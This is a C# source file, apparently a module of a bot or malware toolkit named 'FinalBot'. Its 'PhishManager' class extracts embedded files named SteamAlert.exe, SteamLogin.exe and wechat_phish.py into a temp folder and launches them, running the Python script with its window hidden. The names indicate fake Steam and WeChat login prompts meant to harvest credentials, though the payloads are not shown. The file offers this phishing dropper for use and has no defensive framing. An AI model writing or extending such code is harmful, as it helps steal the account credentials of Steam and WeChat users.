using System;
using System.IO;
using System.Reflection;
using System.Diagnostics;
using System.Threading.Tasks;

namespace FinalBot.Modules
{
    public static class PhishManager
    {
        private static readonly string _tempDir = Path.Combine(Path.GetTempPath(), "FinalTempSys");

        private static void EnsureTempDir()
        {
            if (!Directory.Exists(_tempDir))
            {
                Directory.CreateDirectory(_tempDir);
            }
        }

        private static string ExtractResource(string resourceName, string outFileName)
        {
            EnsureTempDir();
            string outPath = Path.Combine(_tempDir, outFileName);

            // If it already exists, assume it's fine to reuse (or delete and recreate)
            if (File.Exists(outPath))
            {
                try { File.Delete(outPath); } catch { return outPath; }
            }

            try
            {
                var assembly = Assembly.GetExecutingAssembly();
                using (Stream stream = assembly.GetManifestResourceStream($"FinalBot.{resourceName}"))
                {
                    if (stream == null) return null;

                    using (FileStream fileStream = new FileStream(outPath, FileMode.Create, FileAccess.Write))
                    {
                        stream.CopyTo(fileStream);
                    }
                }
                return outPath;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[PHISH] Failed to extract {resourceName}: {ex.Message}");
                return null;
            }
        }

        public static void LaunchSteamAlert()
        {
            string exePath = ExtractResource("SteamAlert.exe", "SteamAlert.exe");
            if (!string.IsNullOrEmpty(exePath))
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName = exePath,
                    UseShellExecute = true
                });
            }
        }

        public static void LaunchSteamLogin()
        {
            string exePath = ExtractResource("SteamLogin.exe", "SteamLogin.exe");
            if (!string.IsNullOrEmpty(exePath))
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName = exePath,
                    UseShellExecute = true
                });
            }
        }

        public static void LaunchWeChatPhish()
        {
            // Note: Since wechat_phish.py is a Python script, we attempt to run it with python
            string scriptPath = ExtractResource("core.wechat_phish.py", "wechat_phish.py");
            if (!string.IsNullOrEmpty(scriptPath))
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName = "python",
                    Arguments = $"\"{scriptPath}\"",
                    UseShellExecute = true,
                    CreateNoWindow = true
                });
            }
        }
    }
}
